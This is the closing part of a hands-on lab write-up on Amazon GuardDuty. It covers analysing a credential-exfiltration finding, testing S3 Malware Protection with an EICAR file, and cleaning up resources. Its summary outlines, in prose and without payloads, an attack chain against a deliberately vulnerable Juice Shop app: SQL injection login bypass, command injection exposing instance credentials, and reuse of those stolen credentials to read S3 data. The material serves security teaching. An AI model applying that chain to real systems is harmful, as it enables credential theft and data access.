
<br/>

> **🔐 Now it's time to switch hats—** from attacker back to defender, and see if **Amazon GuardDuty** caught our moves...

<br/>

---

## Step 5 - Detect the Attack with GuardDuty

<br/>

- As the engineer that deployed this web app, let's see whether GuardDuty detected malicious activity from the attacker.

<br/>

**In this step you're going to:**
- Find and analyze GuardDuty's findings.

<br/>

- ![image](https://github.com/user-attachments/assets/2a4bb851-c7fe-4c71-aacc-7c7cbad352a1)

<br/>

- Navigate to the `GuardDuty` console.
- ![image](https://github.com/user-attachments/assets/1755fe01-733a-439c-8949-b65f1964f077)
- We're transported to the GuardDuty Summary page and it looks like there has been a finding! `1` in total! Let's see check it out. Click on the number `1` under "**Total findings**" to investigate.
- ![image](https://github.com/user-attachments/assets/58e402b5-1761-450c-a18c-1649b0b3fe62)
- After clicking, you should a similar screen on the "**Findings**" page:
- ![image](https://github.com/user-attachments/assets/939375c5-1d79-4f28-a829-b5862e5407af)

<br/>

> 💡 **What is a finding?**
> 
> - A GuardDuty **finding** is a notification that something suspicious has happened in your AWS environment.
> 
> - The finding tells you **what** happened, **who** did it, and **how** they did it. This helps you understand the attack and fix the problem.
> 
> - 🚨 GuardDuty may take 15-20 min to report a finding after an attack.

<br/>

- Clicking on the finding brings you to a page where it gives you more details about the attack. It states "**Credentials created exclusively for an EC2 instance using instance role GuardDuty-project-am-TheRole-s8KoztzPkN73 have been used from a remote AWS account 693416480505.**" Notice the account number is different from yours because the commands performed in CloudShell register as a different AWS account, which is why GuardDuty found it so suspicious.
- ![image](https://github.com/user-attachments/assets/b2c9bd03-3478-4044-bdd4-4691d113b7e3)

<br/>

> 💡 **What did GuardDuty find?**
> 
> - Great! GuardDuty detected something very suspicious. The security credentials you gave to an EC2 instance (i.e. the web app server) is being used by another AWS account!
> 
> - As a reminder, CloudShell runs in a temporary account **separate** from your own AWS account. So, using CloudShell running commands using the **stolen** profile is definitely unusual to GuardDuty. Only one thing should be able to use those credentials, and it's the web server - not a profile from another AWS account.
> 
> - Because of this, GuardDuty triggers the finding **`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS`**
> 
> - Let's break it down:
> 	- **`UnauthorizedAccess`** means someone tried to do something they shouldn't have the right to within your AWS environment.
> 	- **`IAMUser/InstanceCredentialExfiltration`** is the unauthorized activity that GuardDuty detected. Credentials assigned to an EC2 instance (i.e. web server of your web app) were used in a suspicious way, so it's likely that they were stolen. This data breach is called **exfiltration**.
> 	- **`InsideAWS`** tells us that the unauthorized access happened within AWS, but by a different AWS account to yours.
> 
> 💡 **How did GuardDuty pick up on this?**
> 
> - GuardDuty uses advanced machine learning algorithms to always monitor and analyze your account's activity.
> 
> - In this case, there would've been an **anomaly detection** algorithm, which means an algorithm that picked up on an unusual use of your EC2 instance's credentials. GuardDuty would compare this activity against the instance's typical use of its AWS account credentials, and decide that copying an S3 bucket object is out of the ordinary.

<br/>

- Let's Analyze the Finding a bit more. The finding provides gives you all the details about the unauthorized access, including:
	- The **Resource affected**, which tells you the attack used an IAM role to access your juice shop's S3 bucket.
	- ![image](https://github.com/user-attachments/assets/b4ba016e-9a00-4487-bda9-629f1b6a8994)
	- The **Action**, which tells you that an object (i.e. the important information text file) was retrieved.
	- ![image](https://github.com/user-attachments/assets/00cda268-e1e0-4486-a3c8-c1df9c06ca82)
	- The **Location** and **IP address** of the attacker, which would be a location in your AWS Region at the time of using CloudShell.
	- ![image](https://github.com/user-attachments/assets/6b12ab2a-766b-4fdc-b236-b97fd99c8bf3)
	- This information is so helpful for analyzing the source of an attack, who the attacker could've been, whether there are threats to anticipate now based on what they retrieved, and how to prevent similar breaches in the future.

<br/>

- ✅ This confirms GuardDuty is working correctly—detecting threats like stolen credentials being used inappropriately across AWS accounts. **Step 5 - Detect the Attack with GuardDuty** is now complete!

<br/>

> - Next let's take on a secret mission if you are up for a challenge! Your mission is to level up your GuardDuty skills using **Malware Protection**.

<br/>

---

## 💎 Secret Mission: Use S3 Malware Protection

<br/>

**In this secret mission, get ready to:**
- Enable malware protection in GuardDuty.
- Upload a test malware file to the S3 bucket.
- Verify GuardDuty's findings.
- Showcase more advanced knowledge, like **malware protection** and **malware test files**, in your **project documentation**. Stand out from the rest!

<br/>

- ![image](https://github.com/user-attachments/assets/1975a8c5-e11e-4287-9a19-4e9bc9c4cf40)

<br/>

- Let's begin the process of enabling malware protection on an S3 bucket. In the `GuardDuty` console, click **Malware Protection for S3** from the left hand navigation panel.
- ![image](https://github.com/user-attachments/assets/3dd5e5ef-ea9a-4c54-ae49-6bfb66c8685e)
- You are now on the "**Malware Protection for S3**" page. Click the "**Enable**" button.
- ![image](https://github.com/user-attachments/assets/f44c759e-6314-4eca-a8eb-d411a49d17c9)
- We're now on the "**Enable Malware Protection for S3**" page.
- ![image](https://github.com/user-attachments/assets/0437d03c-2651-4aca-a8ba-b21810467ac2)
- For the S3 bucket, click "**Browse S3**". 
- ![image](https://github.com/user-attachments/assets/e8fc2944-7749-49a2-a26e-44ccc84a1354)
- Then select the bucket we deployed in our CloudFormation template. When done, click the "**Select**" button. When you get back to the "**Enter S3 bucket details**" section, within the "**Prefix**" subsection, leave it as "**All the objects in the S3 bucket**".
- ![image](https://github.com/user-attachments/assets/d37e7e57-ed45-42a5-be1c-e5212b4c77d8)
- For the "**Tag scanned objects**" section, select "**Do not tag objects**" because it will give us extra cost and is not needed for this project.
- ![image](https://github.com/user-attachments/assets/69300921-0d48-41d6-9ede-8957ddac85e8)
- We'll leave the default settings **Service access**. Skip "**Tag Malware Protection Plan ID - optional**". Then click "**Enable**" when you're done.
- ![image](https://github.com/user-attachments/assets/c1ee76ba-4fee-4940-8a2c-27f4455ad1c7)
- Success!
- ![image](https://github.com/user-attachments/assets/9cd1f57c-f757-48ab-ad0d-6ef25a7ab41e)
- Now let's test the malware protection by uploading malware. From the "**Protected buckets**" panel, click you S3 bucket.
- ![image](https://github.com/user-attachments/assets/b53561fd-da2c-4852-87de-c1bb43249d10)
- Then in "**Malware Protection for S3 details**" click the "**S3 bucket name**". This is our shortcut for getting into the bucket itself.
- ![image](https://github.com/user-attachments/assets/cde14ac7-17d6-40d4-b7f9-40977240b3b4)
- Now within the bucket, we'll upload a test file from EICAR. I retrieved it from the website https://www.eicar.org/download-anti-malware-testfile. Right click on the `EICAR.TXT` download button and click "Save Link As...", then save the file as whatever you like.
- ![image](https://github.com/user-attachments/assets/df1d1414-04f7-43f1-8523-a9a5776b4076)
- Go back to your bucket and click "**Upload**".
- ![image](https://github.com/user-attachments/assets/470738df-b190-4523-93bb-21b5b412ccf1)
- When you reach the screen, either drag the file in or click "**Add files**" and add it that way. When done, click "**Upload**".
- ![image](https://github.com/user-attachments/assets/f86f478d-8973-47ec-af84-06a2817da78a)
- ![image](https://github.com/user-attachments/assets/bd1922e9-512b-4e56-91a4-dc5b3d6e2d21)
- Successful upload!
- ![image](https://github.com/user-attachments/assets/6a145817-5e03-454c-be17-a79e93629108)

<br/>

> 💡 **What's an EICAR test file?**
> 
> - An EICAR test file is a harmless file that is programmed to make antivirus software think it's malware.
> 
> - It's like a fake virus that helps test if your antivirus software is working properly without actually using a real virus. In our case, we're using the test file to verify whether GuardDuty can detect malware.
> 
> - Tip: In case you were wondering, EICAR stands for the company that developed it - the European Institute for Computer Antivirus Research (EICAR).

<br/>

- Now that we successfully uploaded the malware, we can head back to `GuardDuty` and see if it detected anything. Upon arriving it looks like we got another hit! Perfect! Click into the findings to see what it picked up.
- ![image](https://github.com/user-attachments/assets/755cb0de-d561-42b6-a222-2c193f7cc3f3)
- Look what we have here! It states "**A malware scan on your S3 object EICAR-test-file.txt has detected a security risk EICAR-Test-File (not a virus).**" Fascinating! The AI is even smart enough to tell that the file is not actually a virus and can probably tell that we are simply running a test. Let's click into it to find out more.
- ![image](https://github.com/user-attachments/assets/f7cfe700-4357-4174-9e08-c48e2458d7a6)
- Here's a bit of what we see when we click the finding:
- ![image](https://github.com/user-attachments/assets/cea8c8a8-ff77-485a-96ee-025cebcc69e1)
- Click on the small, blue "**Info**" button for a little insight. A panel should pop up on the right hand side with a small summary of the finding.
- ![image](https://github.com/user-attachments/assets/009d94f8-1b5e-43ba-955f-bf558b7d144c)
- S3 Malware Protection is working!
	- **To summarize what we did in the mission**: Once we uploaded the malware, **GuardDuty** instantly triggered a finding called `Object:S3/MaliciousFile`. This verified that GuardDuty could successfully detect malware. It also mentioned that the threat type is `EICAR-Test-File` (which means not a virus).
- That concludes the **Secret Mission: Use S3 Malware Protection**! ✅

<br/>

> - Now that we've explored the web app and GuardDuty, it's time to clean up the resources we created. This is so important to avoid incurring unnecessary costs.

<br/>

---

## 🗑️ Before you go: Delete your resources

<br/>

**Resources to delete:**
- Delete the **CloudFormation** stack.
- Delete the **CloudFormation** template from **S3**.
- Delete `credentials.json` and `secret-information.txt` in CloudShell.

<br/>

- Let's start with the CloudFormation stack. Head to the console and select the stack you deployed to create your web app. Then click "**Delete**".
- ![image](https://github.com/user-attachments/assets/e8511452-0654-4664-92e0-9ba058c44513)
- Then "**Delete**" again.
- ![image](https://github.com/user-attachments/assets/cec9ed6c-8624-40b3-8db6-0e27dbe5b474)
- Next, head to the S3 console. You might notice that you have a bucket starting with `cf-templates-`! This is a bucket that CloudFormation automatically created. It stores the template you used to create your CloudFormation stack.
- ![image](https://github.com/user-attachments/assets/99da7449-d9f4-44c0-99e0-bdc2a995703b)
- Since we don't need the template anymore, let's delete the bucket too. Select the bucket, click "**Empty**". Then type "permanently delete" to confirm deletion. Then click "**Empty**" again.
- ![image](https://github.com/user-attachments/assets/07638e5b-82cb-40d1-9bd8-8ba7aadb6c6d)
- Bucket empty! Click "**Exit**".
- ![image](https://github.com/user-attachments/assets/35b849e3-0da5-4d78-9431-ad595a22ee38)
- Now that everything inside has been permanently deleted, you can delete the actual bucket. Select the bucket again, click "**Delete**", enter the name of the bucket to confirm deletion, then click "**Delete bucket**".
- ![image](https://github.com/user-attachments/assets/e0e5dcf2-53f9-44af-8e17-1cef1f911b86)
- Bucket deleted!
- ![image](https://github.com/user-attachments/assets/1a324c8b-b4e9-4d7a-8725-5ce0fdbaad30)
- Now let's go back to our CloudShell environment and delete whatever we downloaded in there. First run `ls` to see what is there.
- ![image](https://github.com/user-attachments/assets/ec859e0d-fcad-4dec-963e-095b53215902)
- Then run `rm credentials.json secret-information.txt`. After that, run `ls` to confirm they are gone.
- ![image](https://github.com/user-attachments/assets/fa40955c-6e07-47fe-9793-4b160464fb3a)
- Finally, in your local machine's Downloads folder, you can delete your `EICAR-test-file.txt`.
- ![image](https://github.com/user-attachments/assets/22b00fb5-ec7e-4455-9883-311605b60a90)
- With that done, our project is complete! ✅

<br/>

---

## Summary

**Project Title:** Threat Detection with Amazon GuardDuty

**Project Goal:** To demonstrate using GuardDuty to detect attacks on a vulnerable web application.

**Steps:**

1. **Deploy Vulnerable Web App:** A vulnerable web application (OWASP Juice Shop) was deployed using a CloudFormation template. This took approximately 10 minutes. This step created 27 resources.
2. **Hacker Mode: Bypassing Login:** We simulated a hacker attempting to access the application, using SQL injection to bypass login authentication.
3. **Hacker Mode: Command Injection:** Command injection was used to execute code on the EC2 instance hosting the web app, exposing AWS credentials. This resulted in a publicly accessible file (`credentials.json`) containing access keys.
4. **Hacker Mode: Accessing S3 Bucket:** Using the stolen credentials, a new AWS profile was created in CloudShell. This profile was used to access the S3 bucket and download a file containing sensitive information.
5. **GuardDuty Analysis:** The GuardDuty console was reviewed to analyze the findings of the simulated attack. GuardDuty detected unauthorized access and flagged the suspicious activity.
6. **Secret Mission: Malware Protection:** Malware protection was enabled for the S3 bucket. A harmless test file was uploaded to verify the functionality of this protection. GuardDuty successfully detected and flagged the test file.
7. **Cleanup:** All deployed resources (CloudFormation stack, template bucket, files) were deleted.

**Services Used:**

- **Amazon GuardDuty:** AI-powered threat detection service.
- **Amazon CloudFormation:** Infrastructure as code service for deploying resources.
- **Amazon S3:** Object storage service.
- **Amazon EC2:** Virtual server.
- **AWS CloudShell:** Cloud-based shell environment.
- **IAM (Identity and Access Management):** For managing user access and permissions

---
